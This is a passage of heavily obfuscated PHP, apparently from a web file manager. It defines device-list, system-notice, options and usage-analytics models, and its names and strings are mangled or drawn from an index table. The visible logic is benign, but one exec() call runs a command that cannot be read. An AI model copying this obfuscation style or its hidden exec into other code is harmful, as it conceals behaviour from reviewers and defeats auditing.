$èÑùó[$í§½ï¿´[1671]] = isset($×¹¿¸—‡[$ø„ÄîÆ§]) ? $×¹¿¸—‡[$ø„ÄîÆ§] : $Š¯˜‚ñ; $èÑùó[$í§½ï¿´[2163]] = $éÒ¿ï©‹; $Ø¥ÎÚÀà = json_decode($èÑùó[$í§½ï¿´[528]], !0); $èÑùó[$í§½ï¿´[2446]] = isset($Ø¥ÎÚÀà[$í§½ï¿´[2446]]) ? $Ø¥ÎÚÀà[$í§½ï¿´[2446]] : $í§½ï¿´[12]; $èÑùó[$í§½ï¿´[2450]] = IpLocation::get($èÑùó[$í§½ï¿´[2446]]); if (strpos($ø„ÄîÆ§, $í§½ï¿´[2222]) === 0 || isset($Ø¥ÎÚÀà[$í§½ï¿´[2220]])) { $Ø¥ÎÚÀà[$í§½ï¿´[90]] = $â¦ÑØ¬ğ[$Ø¥ÎÚÀà[$í§½ï¿´[193]]]; $Ø¥ÎÚÀà[$í§½ï¿´[2236]] = $â¦ÑØ¬ğ[$Ø¥ÎÚÀà[$í§½ï¿´[2220]]]; if ($Ø¥ÎÚÀà[$í§½ï¿´[33]] == $í§½ï¿´[625]) { $Ø¥ÎÚÀà[$í§½ï¿´[528]][$í§½ï¿´[1252]] = $â¦ÑØ¬ğ[$Ø¥ÎÚÀà[$í§½ï¿´[528]][$í§½ï¿´[1252]]]; $Ø¥ÎÚÀà[$í§½ï¿´[528]][$í§½ï¿´[1253]] = $â¦ÑØ¬ğ[$Ø¥ÎÚÀà[$í§½ï¿´[528]][$í§½ï¿´[1253]]]; } if ($Ø¥ÎÚÀà[$í§½ï¿´[33]] == $í§½ï¿´[2231]) { $Ø¥ÎÚÀà[$í§½ï¿´[528]][$í§½ï¿´[193]] = $â¦ÑØ¬ğ[$Ø¥ÎÚÀà[$í§½ï¿´[528]][$í§½ï¿´[193]]]; } if ($Ø¥ÎÚÀà[$í§½ï¿´[33]] == $í§½ï¿´[1954]) { $Ø¥ÎÚÀà[$í§½ï¿´[2236]] = $Ø¥ÎÚÀà[$í§½ï¿´[90]]; $Ø¥ÎÚÀà[$í§½ï¿´[2220]] = $Ø¥ÎÚÀà[$í§½ï¿´[2236]][$í§½ï¿´[193]]; $Ø¥ÎÚÀà[$í§½ï¿´[90]] = !1; $Ø¥ÎÚÀà[$í§½ï¿´[193]] = $í§½ï¿´[12]; } $Ñ¬Ù‰áÏ = array($í§½ï¿´[1954], $í§½ï¿´[2218]); if (!in_array($Ø¥ÎÚÀà[$í§½ï¿´[33]], $Ñ¬Ù‰áÏ)) { if ($Ø¥ÎÚÀà[$í§½ï¿´[90]] && $Ø¥ÎÚÀà[$í§½ï¿´[90]][$í§½ï¿´[190]] == $í§½ï¿´[191]) { $û¶½ãâš[] = $èÑùó[$í§½ï¿´[477]]; unset($ÉÃš‹—Í[$–øâ•ğ™]); continue; } if ($Ø¥ÎÚÀà[$í§½ï¿´[2236]] && $Ø¥ÎÚÀà[$í§½ï¿´[2236]][$í§½ï¿´[190]] == $í§½ï¿´[191]) { $û¶½ãâš[] = $èÑùó[$í§½ï¿´[477]]; unset($ÉÃš‹—Í[$–øâ•ğ™]); continue; } } } $èÑùó[$í§½ï¿´[528]] = $Ø¥ÎÚÀà; unset($èÑùó[$í§½ï¿´[2455]]); $ıÕ¹»ûò[] = $èÑùó; } $this->clearSystemPathLog($û¶½ãâš); return $ıÕ¹»ûò; } private function clearSystemPathLog($§ô¾ª«…) { $à¢ä¢Éé =& $_SERVER[¡¬ıÜ ƒ]; if (count($§ô¾ª«…) == 0) { return; } $÷òô­Ùı = array($à¢ä¢Éé[477] => array($à¢ä¢Éé[7], array_unique($§ô¾ª«…))); $this->where($÷òô­Ùı)->delete(); } public function deviceList($ƒŠ¸Ú¢Û, $íĞÕØë = 0) { $‘Êûñ÷Ñ =& $_SERVER[¡¬ıÜ ƒ]; $Á†ÔÆçÈ = array($‘Êûñ÷Ñ[1785] => $ƒŠ¸Ú¢Û, $‘Êûñ÷Ñ[233] => array($‘Êûñ÷Ñ[1102], $íĞÕØë), $‘Êûñ÷Ñ[33] => $‘Êûñ÷Ñ[1928]); $ñğ†¢´ı = array(); $†¯¤´©¹ = $this->field($‘Êûñ÷Ñ[2456])->where($Á†ÔÆçÈ)->order($‘Êûñ÷Ñ[2234])->limit(50)->select(); foreach ($†¯¤´©¹ as $ºÁ¿–ı => $›ûÜ´ãÕ) { if ($ºÁ¿–ı > 0 && abs($›ûÜ´ãÕ[$‘Êûñ÷Ñ[233]] - $†¯¤´©¹[$ºÁ¿–ı - 1][$‘Êûñ÷Ñ[233]]) < 5) { continue; } $±¥¬úå‹ = json_decode($›ûÜ´ãÕ[$‘Êûñ÷Ñ[528]], !0); $›ûÜ´ãÕ[$‘Êûñ÷Ñ[2446]] = isset($±¥¬úå‹[$‘Êûñ÷Ñ[2446]]) ? $±¥¬úå‹[$‘Êûñ÷Ñ[2446]] : $‘Êûñ÷Ñ[12]; unset($±¥¬úå‹[$‘Êûñ÷Ñ[2446]]); $õ×¤î× = $this->deviceType($±¥¬úå‹[$‘Êûñ÷Ñ[2223]]); if (isset($ñğ†¢´ı[$õ×¤î×])) { continue; } $›ûÜ´ãÕ[$‘Êûñ÷Ñ[2450]] = IpLocation::get($›ûÜ´ãÕ[$‘Êûñ÷Ñ[2446]]); $›ûÜ´ãÕ[$‘Êûñ÷Ñ[528]] = $±¥¬úå‹; $ñğ†¢´ı[$õ×¤î×] = $›ûÜ´ãÕ; } return array_values($ñğ†¢´ı); } public function deviceType($ğ×Åæ§æ) { return $ğ×Åæ§æ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\x2e\x6e\x6f\x74\x69\143\145\x4c\151\x73\164"; public $field = array("\156\141\x6d\x65", "\143\x6f\x6e\164\x65\x6e\x74", "\141\165\164\x68", "\x6d\x6f\144\145", "\164\x69\155\145", "\164\x79\160\x65", "\x6c\x65\x76\145\154", "\145\156\x61\x62\x6c\145", "\x73\x6f\162\164"); public function listData($áôÆÏ½Í = false, $üî°¨àî = "\x73\x6f\x72\x74", $•º“ÑÈÆ = false) { return parent::listData($áôÆÏ½Í, $üî°¨àî, $•º“ÑÈÆ); } public function add($•€§· Ø) { $íÂ‚¨Õ“ =& $_SERVER[¡¬ıÜ ƒ]; $¹´Òìè = time(); if ($•€§· Ø[$íÂ‚¨Õ“[16]] == $íÂ‚¨Õ“[2457]) { $¹´Òìè = strtotime($•€§· Ø[$íÂ‚¨Õ“[206]]); } $•€§· Ø[$íÂ‚¨Õ“[206]] = $¹´Òìè; return parent::insert($•€§· Ø); } public function update($–œÜÓ¾, $é¦«èŠé) { $ğ­ºÃ•¹ =& $_SERVER[¡¬ıÜ ƒ]; $Ì‚ÚŞ­ª = $this->listData($–œÜÓ¾); if (!$Ì‚ÚŞ­ª) { return !1; } $öğ¸çÕü = time(); if ($é¦«èŠé[$ğ­ºÃ•¹[16]] == $ğ­ºÃ•¹[2457]) { $öğ¸çÕü = strtotime($é¦«èŠé[$ğ­ºÃ•¹[206]]); } $é¦«èŠé[$ğ­ºÃ•¹[206]] = $öğ¸çÕü; return parent::update($–œÜÓ¾, $é¦«èŠé); } public function remove($¹ÅÀŸ±ğ) { $·ùĞûå– = $this->listData($¹ÅÀŸ±ğ); if (!$·ùĞûå– || $·ùĞûå–[$_SERVER[¡¬ıÜ ƒ][191]]) { return !1; } return parent::remove($¹ÅÀŸ±ğ); } public function sort($ûøßòŒú, $¶ıá´Œ—) { return parent::update($ûøßòŒú, $¶ıá´Œ—); } public function enable($ù›´ìòÙ, $Î›¸ğäñ) { return parent::update($ù›´ìòÙ, array($_SERVER[¡¬ıÜ ƒ][2458] => $Î›¸ğäñ)); } private function initUserOption() { $èéĞËÕ =& $_SERVER[¡¬ıÜ ƒ]; $this->optionType = $èéĞËÕ[2459]; $this->modelType = $èéĞËÕ[2460]; $this->field = array($èéĞËÕ[2461], $èéĞËÕ[32], $èéĞËÕ[206], $èéĞËÕ[33], $èéĞËÕ[2462], $èéĞËÕ[830], $èéĞËÕ[228]); } public function userNoticeGet($­Ş¡ñÑ’ = false) { $this->initUserOption(); return parent::listData($­Ş¡ñÑ’, $_SERVER[¡¬ıÜ ƒ][477], !0); } public function userNoticeAdd($Ğ³ÁÌ¬Ë) { $Ø’ï‚ã =& $_SERVER[¡¬ıÜ ƒ]; $this->initUserOption(); $Š•Á¬€ = $this->findByKey($Ø’ï‚ã[2461], $Ğ³ÁÌ¬Ë[$Ø’ï‚ã[477]]); if ($Š•Á¬€) { return !0; } $·¯ü÷õÛ = array($Ø’ï‚ã[2461] => $Ğ³ÁÌ¬Ë[$Ø’ï‚ã[477]], $Ø’ï‚ã[32] => $Ğ³ÁÌ¬Ë[$Ø’ï‚ã[32]], $Ø’ï‚ã[206] => $Ğ³ÁÌ¬Ë[$Ø’ï‚ã[206]], $Ø’ï‚ã[33] => isset($Ğ³ÁÌ¬Ë[$Ø’ï‚ã[33]]) ? $Ğ³ÁÌ¬Ë[$Ø’ï‚ã[33]] : 1, $Ø’ï‚ã[2462] => isset($Ğ³ÁÌ¬Ë[$Ø’ï‚ã[2462]]) ? $Ğ³ÁÌ¬Ë[$Ø’ï‚ã[2462]] : 0, $Ø’ï‚ã[830] => 0, $Ø’ï‚ã[228] => 0); return parent::insert($·¯ü÷õÛ); } public function userNoticeEdit($œıÎàÎÃ, $»øğÄ®„) { $this->initUserOption(); return parent::update($œıÎàÎÃ, $»øğÄ®„); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\x74\x65\155\x5f\157\x70\164\151\157\156"; protected $jsonField = array("\x6d\145\x6e\x75", "\x72\157\x6c\145", "\x72\157\154\145\107\162\x6f\x75\160", "\162\145\x67\151\x73\x74", "\x65\155\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($Ÿáû‚šª) { return "\123\x79\x73\164\145\155\x4f\x70\164\x69\x6f\x6e\137{$Ÿáû‚šª}"; } protected function optionDefault($¡ì“–­ = '') { $¢‘˜ÚË =& $_SERVER[¡¬ıÜ ƒ]; if ($¡ì“–­ == $¢‘˜ÚË[12]) { return $GLOBALS[$¢‘˜ÚË[6]][$¢‘˜ÚË[459]]; } } } goto FªÍ¯Ùø³’; aÆšÜ„’¸ˆ: class AnalysisModel extends ModelBaseLight { public function init($¶Ò¸—È) { $ÁÀá¶í³ =& $_SERVER[¡¬ıÜ ƒ]; $ü²Ÿİû· = array($ÁÀá¶í³[667] => array($ÁÀá¶í³[33] => $ÁÀá¶í³[1914], $ÁÀá¶í³[352] => array($ÁÀá¶í³[284], $ÁÀá¶í³[845], $ÁÀá¶í³[1915], $ÁÀá¶í³[1916])), $ÁÀá¶í³[1917] => array($ÁÀá¶í³[33] => $ÁÀá¶í³[1918], $ÁÀá¶í³[352] => array($ÁÀá¶í³[284], $ÁÀá¶í³[843], $ÁÀá¶í³[1919], $ÁÀá¶í³[1920], $ÁÀá¶í³[1921]))); if (!isset($ü²Ÿİû·[$¶Ò¸—È])) { return !1; } $this->optionType = $ü²Ÿİû·[$¶Ò¸—È][$ÁÀá¶í³[33]]; $this->field = $ü²Ÿİû·[$¶Ò¸—È][$ÁÀá¶í³[352]]; return !0; } public function listData($ıšìŒâ = false, $«°Óìë = "\155\157\x64\151\x66\x79\124\151\155\145", $ÑÀ¦ú™Û = false) { return parent::listData($ıšìŒâ, $«°Óìë, $ÑÀ¦ú™Û); } public function trendList($­ˆ©Õ¸­) { $ê–‹áé =& $_SERVER[¡¬ıÜ ƒ]; $øøìÑ¦û = $this->listData(); if ($øøìÑ¦û) { $£¶ä‹œŸ = end($øøìÑ¦û); $Îˆî¢ = date($ê–‹áé[1922], strtotime($ê–‹áé[1923])); if ($£¶ä‹œŸ[$ê–‹áé[284]] == $Îˆî¢) { return $øøìÑ¦û; } $€®ŠŞÃ  = strtotime($£¶ä‹œŸ[$ê–‹áé[284]]); } if (!isset($€®ŠŞÃ )) { $ÑÊÉ¸Åš = $­ˆ©Õ¸­ == $ê–‹áé[667] ? $ê–‹áé[599] : $ê–‹áé[914]; $€®ŠŞÃ  = Model($ÑÊÉ¸Åš)->min($ê–‹áé[233]); } $ÎâöşŠ = $ê–‹áé[1924] . ucfirst($­ˆ©Õ¸­); $™„¸úì¬ = $this->dateList($€®ŠŞÃ ); foreach ($™„¸úì¬ as $Îˆî¢) { $this->{$ÎâöşŠ}($Îˆî¢); } return $this->listData(); } private function dateList($š¥×„â§) { $„¹¡©œÒ =& $_SERVER[¡¬ıÜ ƒ]; $“§²Çà = $š¥×„â§; $Ş ãÈ½² = strtotime($„¹¡©œÒ[1923]); $ßˆù­èÉ = array(); while ($“§²Çà <= $Ş ãÈ½²) { $ßˆù­èÉ[] = date($„¹¡©œÒ[1922], $“§²Çà); $“§²Çà = strtotime($„¹¡©œÒ[1925], $“§²Çà); } return $ßˆù­èÉ; } public function _recordUser($Í¼÷å² = '') { $½»²½İÁ =& $_SERVER[¡¬ıÜ ƒ]; $ÇëˆÅÒ¸ = strtotime(date($½»²½İÁ[1926], strtotime($Í¼÷å²))); $†ä¨¹ = strtotime(date($½»²½İÁ[1927], strtotime($Í¼÷å²))); $¨âìÉš = array($½»²½İÁ[233] => array($½»²½İÁ[1101], $†ä¨¹)); $´Ïú£İé = Model($½»²½İÁ[599])->where($¨âìÉš)->count($½»²½İÁ[1785]); $¨âìÉš[$½»²½İÁ[233]] = array($½»²½İÁ[410], array($ÇëˆÅÒ¸, $†ä¨¹)); $’“·î¨ı = Model($½»²½İÁ[599])->where($¨âìÉš)->count($½»²½İÁ[1785]); $¨âìÉš[$½»²½İÁ[33]] = $½»²½İÁ[1928]; $ìñœÍÈˆ = Model($½»²½İÁ[1929])->where($¨âìÉš)->count($½»²½İÁ[1930]); $Ââú¼É‚ = array($½»²½İÁ[284] => $Í¼÷å², $½»²½İÁ[845] => (int) $´Ïú£İé, $½»²½İÁ[1915] => (int) $’“·î¨ı, $½»²½İÁ[1916] => (int) $ìñœÍÈˆ); return $this->insert($Ââú¼É‚); } public function _recordStore($ùÜ¾Œ¬ş = '') { $Íí¨ÆÆ =& $_SERVER[¡¬ıÜ ƒ]; $Û‘¤ŒµÑ = strtotime(date($Íí¨ÆÆ[1927], strtotime($ùÜ¾Œ¬ş))); $õ ÀùÀÒ = array($Íí¨ÆÆ[233] => array($Íí¨ÆÆ[1101], $Û‘¤ŒµÑ)); $ôåğÂÚ = Model($Íí¨ÆÆ[546])->where($õ ÀùÀÒ)->sum($Íí¨ÆÆ[79]); $õ ÀùÀÒ[$Íí¨ÆÆ[487]] = 0; $áÀ¸±æ = Model($Íí¨ÆÆ[914])->where($õ ÀùÀÒ)->sum($Íí¨ÆÆ[79]); $õ ÀùÀÒ[$Íí¨ÆÆ[190]] = 1; $Å°ãõŸá = Model($Íí¨ÆÆ[914])->where($õ ÀùÀÒ)->sum($Íí¨ÆÆ[79]); $õ ÀùÀÒ[$Íí¨ÆÆ[190]] = 2; $´áÁàÍˆ = Model($Íí¨ÆÆ[914])->where($õ ÀùÀÒ)->sum($Íí¨ÆÆ[79]); $õ¹î£Ÿ = array($Íí¨ÆÆ[284] => $ùÜ¾Œ¬ş, $Íí¨ÆÆ[843] => (int) $áÀ¸±æ, $Íí¨ÆÆ[1919] => (int) $ôåğÂÚ, $Íí¨ÆÆ[1920] => (int) $Å°ãõŸá, $Íí¨ÆÆ[1921] => (int) $´áÁàÍˆ); return $this->insert($õ¹î£Ÿ); } public function trend($íª«Í¿¤, $í›ŠƒÉÓ) { $«Éş„«Á =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->init($íª«Í¿¤)) { return !1; } $ŒßŠò½ê = $this->trendList($íª«Í¿¤); if ($ŒßŠò½ê && $í›ŠƒÉÓ != $«Éş„«Á[1757]) { $Ò°Ö¯É = $ŒßŠò½ê[0][$«Éş„«Á[284]]; $ŒğÂ¨éø = $this->validDate($í›ŠƒÉÓ, $Ò°Ö¯É); $›¢Ò“´ñ = array(); $ÅŠÇåÙ = array_to_keyvalue($ŒßŠò½ê, $«Éş„«Á[284]); foreach ($ŒğÂ¨éø as $Ç¦Õùƒ) { if (isset($ÅŠÇåÙ[$Ç¦Õùƒ])) { $¡´Ìåî = $ÅŠÇåÙ[$Ç¦Õùƒ]; } else { $¡´Ìåî = end($ŒßŠò½ê); $¡´Ìåî[$«Éş„«Á[284]] = $Ç¦Õùƒ; if ($íª«Í¿¤ == $«Éş„«Á[667]) { $¡´Ìåî[$«Éş„«Á[1915]] = $¡´Ìåî[$«Éş„«Á[1916]] = 0; } } $›¢Ò“´ñ[] = $¡´Ìåî; } $ŒßŠò½ê = $›¢Ò“´ñ; } $úØºóşê = array($«Éş„«Á[667] => array($«Éş„«Á[845] => LNG($«Éş„«Á[1931]), $«Éş„«Á[1915] => LNG($«Éş„«Á[1932]), $«Éş„«Á[1916] => LNG($«Éş„«Á[1933])), $«Éş„«Á[1917] => array($«Éş„«Á[843] => LNG($«Éş„«Á[1934]), $«Éş„«Á[1919] => LNG($«Éş„«Á[1935]), $«Éş„«Á[1920] => LNG($«Éş„«Á[1936]), $«Éş„«Á[1921] => LNG($«Éş„«Á[1937]))); $«Øæ¼Âü = array($«Éş„«Á[667] => $«Éş„«Á[1938], $«Éş„«Á[1917] => $«Éş„«Á[79]); if (empty($ŒßŠò½ê)) { $Ç¦Õùƒ = date($«Éş„«Á[1922], strtotime($«Éş„«Á[1923])); $ß¬ã€üŠ = array($«Éş„«Á[284] => $Ç¦Õùƒ); foreach ($úØºóşê[$íª«Í¿¤] as $Ïä¹“àõ => $âèüòä») { $ß¬ã€üŠ[$Ïä¹“àõ] = 0; } $ŒßŠò½ê[] = $ß¬ã€üŠ; } $äÄšñ‘ = array(); foreach ($ŒßŠò½ê as $âèüòä») { if ($íª«Í¿¤ == $«Éş„«Á[1917] && $âèüòä»[$«Éş„«Á[1919]] > $âèüòä»[$«Éş„«Á[843]]) { $âèüòä»[$«Éş„«Á[1919]] = $âèüòä»[$«Éş„«Á[843]]; } foreach ($úØºóşê[$íª«Í¿¤] as $Ïä¹“àõ => $ÃÖ–Êõ±) { $¡´Ìåî = array($«Éş„«Á[284] => $âèüòä»[$«Éş„«Á[284]], $«Éş„«Á[1671] => $ÃÖ–Êõ±); $¡´Ìåî[$«Øæ¼Âü[$íª«Í¿¤]] = isset($âèüòä»[$Ïä¹“àõ]) ? $âèüòä»[$Ïä¹“àõ] : 0; $äÄšñ‘[] = $¡´Ìåî; } } return $äÄšñ‘; } public function validDate($’ëÇ±ˆ°, $»“ÅŞŸ ) { $ü«Í„¯‚ =& $_SERVER[¡¬ıÜ ƒ]; $£Éş«ÑÚ = date($ü«Í„¯‚[1922], strtotime($ü«Í„¯‚[1923])); $Œî¹£ò£ = array($£Éş«ÑÚ); switch ($’ëÇ±ˆ°) { case $ü«Í„¯‚[1764]: $Œšºç§¡ = mktime(0, 0, 0, date($ü«Í„¯‚[1939]), date($ü«Í„¯‚[1463]) - date($ü«Í„¯‚[1553]) + 7 - 7, date($ü«Í„¯‚[1940])); $ë´›ÑÙĞ = 0; do { $Ã¼«Ô œ = date($ü«Í„¯‚[1922], $Œšºç§¡ - 3600 * 24 * 7 * $ë´›ÑÙĞ); $Œî¹£ò£[] = $Ã¼«Ô œ; $ë´›ÑÙĞ++; } while ($»“ÅŞŸ  < $Ã¼«Ô œ); break; case $ü«Í„¯‚[1762]: $ë´›ÑÙĞ = 1; do { $ÊË¯Ñ—Ì = date($ü«Í„¯‚[1941], strtotime("\55\40{$ë´›ÑÙĞ}\x20\x6d\157\x6e\x74\150\x73")); $Œî¹£ò£[] = $ÊË¯Ñ—Ì; $ë´›ÑÙĞ++; } while ($»“ÅŞŸ  < $ÊË¯Ñ—Ì); break; case $ü«Í„¯‚[1942]: $ßª§Š¯© = (int) date($ü«Í„¯‚[1940], strtotime($»“ÅŞŸ )); $ëÉª×÷¿ = (int) date($ü«Í„¯‚[1940]); if ($ßª§Š¯© >= $ëÉª×÷¿) { break; } for ($ßª§Š¯©; $ßª§Š¯© < $ëÉª×÷¿; $ßª§Š¯©++) { $Œî¹£ò£[] = $ßª§Š¯© . $ü«Í„¯‚[1943]; } break; default: break; } if ($»“ÅŞŸ  > end($Œî¹£ò£)) { array_pop($Œî¹£ò£); } sort($Œî¹£ò£); return $Œî¹£ò£; } public function listTable($×ÅæËñ) { $¥†ôöÂ¨ = ucfirst($×ÅæËñ); return Model($¥†ôöÂ¨)->listData(); } public function option($¼¼Ú£¾Ğ) { $´ˆ ÆÀâ = $_SERVER[¡¬ıÜ ƒ][1944] . ucfirst($¼¼Ú£¾Ğ); return $this->{$´ˆ ÆÀâ}(); } private function optionUser() { $” ®äğ =& $_SERVER[¡¬ıÜ ƒ]; $­ÄßØì¿ = Model($” ®äğ[599])->count($” ®äğ[1785]); $–•“îš = Model($” ®äğ[599])->where($” ®äğ[1945])->count($” ®äğ[1785]); $àÄÍÒæ = intval($GLOBALS[$” ®äğ[6]][$” ®äğ[426]][$” ®äğ[1730]]) / 3600; $ïüçÌû§ = strtotime("\x2d{$àÄÍÒæ}\40\x68\x6f\x75\x72\163"); $·œæ€í½ = strtotime(date($” ®äğ[1926])); if ($ïüçÌû§ < $·œæ€í½) { $ïüçÌû§ = $·œæ€í½; } $õø“¸Œ¸ = array($” ®äğ[1946] => array($” ®äğ[1102], $ïüçÌû§)); $‹ãºÆÛœ = (int) Model($” ®äğ[599])->where($õø“¸Œ¸)->count($” ®äğ[1785]); if (!$‹ãºÆÛœ) { $‹ãºÆÛœ = 1; } $õø“¸Œ¸ = array($” ®äğ[1946] => array($” ®äğ[1102], $·œæ€í½)); $“âéıÎ¹ = Model($” ®äğ[599])->where($õø“¸Œ¸)->count($” ®äğ[1785]); return array($” ®äğ[838] => (int) $­ÄßØì¿, $” ®äğ[1947] => (int) ($­ÄßØì¿ - $–•“îš), $” ®äğ[1948] => (int) $–•“îš, $” ®äğ[1949] => (int) $“âéıÎ¹, $” ®äğ[1950] => $‹ãºÆÛœ); } private function optionFile() { $íá™…¤ä =& $_SERVER[¡¬ıÜ ƒ]; $ßÆüöêŞ = $this->sourceSize(); $‚Ó¾ºŒ = $ßÆüöêŞ[$íá™…¤ä[79]]; $„¨¡‰‰„ = $ßÆüöêŞ[$íá™…¤ä[1919]]; $òÔƒÎ = Model($íá™…¤ä[914])->where(array($íá™…¤ä[487] => 0))->count($íá™…¤ä[193]); $Şä¢Õ = array($íá™…¤ä[487] => 0, $íá™…¤ä[233] => array($íá™…¤ä[1102], strtotime(date($íá™…¤ä[1926])))); $¦Áå¾÷ñ = Model($íá™…¤ä[914])->where($Şä¢Õ)->sum($íá™…¤ä[79]); $ØÔã æ = Model($íá™…¤ä[914])->where($Şä¢Õ)->count($íá™…¤ä[193]); return array($íá™…¤ä[843] => $‚Ó¾ºŒ, $íá™…¤ä[1919] => $„¨¡‰‰„, $íá™…¤ä[1951] => $‚Ó¾ºŒ - $„¨¡‰‰„, $íá™…¤ä[1952] => (int) $¦Áå¾÷ñ, $íá™…¤ä[845] => (int) $òÔƒÎ, $íá™…¤ä[1953] => (int) $ØÔã æ); } private function optionAccess() { $²ªãì¶¿ =& $_SERVER[¡¬ıÜ ƒ]; return array($²ªãì¶¿[838] => $this->typeLogCnt(), $²ªãì¶¿[110] => $this->typeLogCnt($²ªãì¶¿[110]), $²ªãì¶¿[527] => $this->typeLogCnt($²ªãì¶¿[527]), $²ªãì¶¿[1954] => $this->typeLogCnt($²ªãì¶¿[1954]), $²ªãì¶¿[1955] => $this->typeLogCnt($²ªãì¶¿[1955]), $²ªãì¶¿[667] => $this->typeLogCnt($²ªãì¶¿[12], $²ªãì¶¿[1930])); } private function typeLogCnt($ÑŒòÔæ¯ = '', $««ˆ£ö = "\151\x64") { $‰Ì²œÂ‡ =& $_SERVER[¡¬ıÜ ƒ]; $ã¸ú³Ğ÷ = array($‰Ì²œÂ‡[110] => array($‰Ì²œÂ‡[1956], $‰Ì²œÂ‡[1957]), $‰Ì²œÂ‡[527] => array($‰Ì²œÂ‡[1958], $‰Ì²œÂ‡[1959]), $‰Ì²œÂ‡[1954] => array($‰Ì²œÂ‡[1960], $‰Ì²œÂ‡[1961], $‰Ì²œÂ‡[1962]), $‰Ì²œÂ‡[1955] => array($‰Ì²œÂ‡[1963], $‰Ì²œÂ‡[1964]), $‰Ì²œÂ‡[1965] => array($‰Ì²œÂ‡[1966], $‰Ì²œÂ‡[1967], $‰Ì²œÂ‡[1968])); $ÅÈëœ²‹ = strtotime(date($‰Ì²œÂ‡[1926])); $“¸Ô³ŠÑ = array($‰Ì²œÂ‡[233] => array($‰Ì²œÂ‡[1102], $ÅÈëœ²‹)); if ($ÑŒòÔæ¯) { $“¸Ô³ŠÑ[$‰Ì²œÂ‡[33]] = array($‰Ì²œÂ‡[7], $ã¸ú³Ğ÷[$ÑŒòÔæ¯]); } $ÙŞåÁ—Ù = Model($‰Ì²œÂ‡[1929])->where($“¸Ô³ŠÑ)->count($««ˆ£ö); return (int) $ÙŞåÁ—Ù; } private function optionServer() { $èÚ•»¡ =& $_SERVER[¡¬ıÜ ƒ]; $Äùšá»’ = $this->diskDriver(); $±ÜãôÆ = KodIO::defaultDriver(); $ò Ÿã = array($èÚ•»¡[907] => $±ÜãôÆ[$èÚ•»¡[477]]); $ô¡Å×Š = Model($èÚ•»¡[546])->where($ò Ÿã)->sum($èÚ•»¡[79]); $íùûÂéû = explode($èÚ•»¡[53], $_SERVER[$èÚ•»¡[147]]); $ø›÷‰ = $íùûÂéû[0]; $½ñ—Ø = $GLOBALS[$èÚ•»¡[6]][$èÚ•»¡[21]]; $ÓåÎ«º = $½ñ—Ø[$èÚ•»¡[1064]]; if ($ÓåÎ«º == $èÚ•»¡[1052]) { $¸ñ‚Ô¾ç = explode($èÚ•»¡[1379], $½ñ—Ø[$èÚ•»¡[1063]]); $ÓåÎ«º = $¸ñ‚Ô¾ç[0]; } if ($ÓåÎ«º == $èÚ•»¡[1000] || $ÓåÎ«º == $èÚ•»¡[894]) { $Ï¹ÂìÅØ = Model()->db()->query($èÚ•»¡[1969]); $€Íì³¦î = $Ï¹ÂìÅØ[0] && isset($Ï¹ÂìÅØ[0][$èÚ•»¡[1670]]) ? $Ï¹ÂìÅØ[0][$èÚ•»¡[1670]] : 0; $ÓåÎ«º = $èÚ•»¡[1970] . ($€Íì³¦î ? $èÚ•»¡[8] . $€Íì³¦î : $èÚ•»¡[12]); } $›§÷‘¼Ÿ = $GLOBALS[$èÚ•»¡[6]][$èÚ•»¡[426]][$èÚ•»¡[916]]; return array($èÚ•»¡[1971] => $Äùšá»’ ? $Äùšá»’[$èÚ•»¡[1972]] : 0, $èÚ•»¡[1973] => $Äùšá»’ ? $Äùšá»’[$èÚ•»¡[1974]] : 0, $èÚ•»¡[1975] => (int) $±ÜãôÆ[$èÚ•»¡[1972]] * 1024 * 1024 * 1024, $èÚ•»¡[1976] => (int) $ô¡Å×Š, $èÚ•»¡[1977] => ucfirst($ø›÷‰), $èÚ•»¡[1978] => $èÚ•»¡[1979] . PHP_VERSION, $èÚ•»¡[1980] => phpBuild64() ? 64 : 32, $èÚ•»¡[837] => str_replace($èÚ•»¡[1220], $èÚ•»¡[1080], $ÓåÎ«º), $èÚ•»¡[426] => ucfirst($›§÷‘¼Ÿ), $èÚ•»¡[32] => $_SERVER[$èÚ•»¡[1981]]); } private function diskDriver() { $úóí¶­ =& $_SERVER[¡¬ıÜ ƒ]; $˜ ñŠ¢ = $úóí¶­[8]; $ÖöÈŞ‘• = $GLOBALS[$úóí¶­[6]][$úóí¶­[1396]] == $úóí¶­[1397]; if ($ÖöÈŞ‘•) { $˜ ñŠ¢ = $úóí¶­[1982]; if (function_exists($úóí¶­[1983])) { exec($úóí¶­[1984], $ñ×„¿Ê•); $˜ ñŠ¢ = $ñ×„¿Ê•[1] . $úóí¶­[8]; } } if (!file_exists($˜ ñŠ¢)) { return; } if (!function_exists($úóí¶­[1985])) { return; } $Ì·‡ Ÿ¸ = @disk_total_space($˜ ñŠ¢); $¨‘ªŞâ¢ = $Ì·‡ Ÿ¸ - @disk_free_space($˜ ñŠ¢); return array($úóí¶­[1972] => $Ì·‡ Ÿ¸, $úóí¶­[1974] => $¨‘ªŞâ¢); } public function fileChart($‘¥¤íÑ) { $è‡“È× =& $_SERVER[¡¬ıÜ ƒ]; if (isset($‘¥¤íÑ[$è‡“È×[1785]])) { return Model($è‡“È×[914])->userFileTypeProfile($‘¥¤íÑ[$è‡“È×[1785]]); } if (isset($‘¥¤íÑ[$è‡“È×[1986]])) { return Model($è‡“È×[914])->groupFileTypeProfile($‘¥¤íÑ[$è‡“È×[1986]]); } $½ŠØá¿Å = $this->sourceSize(); $¦†–ÅæÚ = array($è‡“È×[192] => 0, $è‡“È×[190] => 1); $çÃ½¦‹á = Model($è‡“È×[914])->where($¦†–ÅæÚ)->sum($è‡“È×[79]); $¦†–ÅæÚ[$è‡“È×[190]] = 2; $ÈÈÀªğÍ = Model($è‡“È×[914])->where($¦†–ÅæÚ)->sum($è‡“È×[79]); return array($è‡“È×[843] => $½ŠØá¿Å[$è‡“È×[79]], $è‡“È×[1919] => $½ŠØá¿Å[$è‡“È×[1919]], $è‡“È×[1920] => (int) $çÃ½¦‹á, $è‡“È×[1921] => (int) $ÈÈÀªğÍ); } private function sourceSize() { $²ç‰é Û =& $_SERVER[¡¬ıÜ ƒ]; $ìş¢Êã = Model($²ç‰é Û[914])->where(array($²ç‰é Û[487] => 0))->sum($²ç‰é Û[79]); $–“È®¾° = Model($²ç‰é Û[546])->sum($²ç‰é Û[79]); if ($–“È®¾° > $ìş¢Êã) { $–“È®¾° = $ìş¢Êã; } return 